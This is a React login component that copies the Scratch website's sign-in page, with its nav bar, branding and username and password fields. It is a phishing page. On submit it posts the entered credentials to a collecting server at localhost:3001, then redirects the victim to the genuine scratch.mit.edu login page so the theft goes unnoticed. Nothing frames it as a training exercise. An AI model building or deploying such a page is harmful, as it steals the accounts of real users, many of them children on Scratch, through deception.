import axios from "axios";
import React, { useState } from "react";

const Login = () => {
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");

  const handleSubmit = () => {
    axios
      .post("http://localhost:3001/", { user, pass })
      .then(() => {
        setUser("");
        setPass("");
        window.location.href = "https://scratch.mit.edu/login/";
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Failed to send data");
      });
  };

  return (
    <div>
      <nav className="bg-[#855cd6] h-[35px] text-white flex list-none items-center pl-[425px]">
        <img src="images/logo.png" alt="" className="h-[25px] mr-[20px]" />
        <li className="mr-[30px]">Create</li>
        <li className="mr-[30px]">Exploe</li>
        <li className="mr-[30px]">Ideas</li>
        <li className="mr-[30px]">About</li>
        <div className="rounded-[50px] pr-[30px] bg-white text-black flex justify-center items-center">
          <img
            src="./images/search.png"
            className="h-[15px] ml-[10px] mr-[5px]"
            alt=""
          />
          <input
            type="text"
            name=""
            id=""
            placeholder="Search"
            className="outline-[0] border-l-[1px] px-[5px] w-[300px] h-[24px] text-[12px]"
          />
        </div>

        <li className="mr-[30px] font-bold text-[15px] ml-[30px]">
          Join Scratch
        </li>
        <li className="text-[15px] font-bold">Sign in</li>
      </nav>

      <div className="flex flex-col text-[13px] ml-[425px] mt-[25px] h-[83vh]">
        <label htmlFor="">Username</label>
        <input
          type="text"
          name=""
          id=""
          value={user}
          onChange={(e) => setUser(e.target.value)}
          className="border-[2px] w-[225px] pl-[2px] rounded-[4px] mt-[4px] mb-[10px] h-[30px]"
        />
        <label htmlFor="">Password</label>
        <input
          type="text"
          name=""
          value={pass}
          onChange={(e) => setPass(e.target.value)}
          id=""
          className="border-[2px] w-[225px] pl-[2px] rounded-[4px] mt-[4px] mb-[20px] h-[30px]"
        />

        <div className="w-[525px] flex items-center">
          <button
            onClick={handleSubmit}
            class="px-2 py-1 cursor-pointer rounded-[4px] border border-gray-400 text-black bg-gradient-to-t from-gray-300 to-gray-50"
          >
            Login
          </button>
          <p className="text-[#855cd6] ml-[20px]">
            Forgot username or password?
          </p>
        </div>
      </div>

      <img src="./images/footer.png" alt="" />
    </div>
  );
};

export default Login;
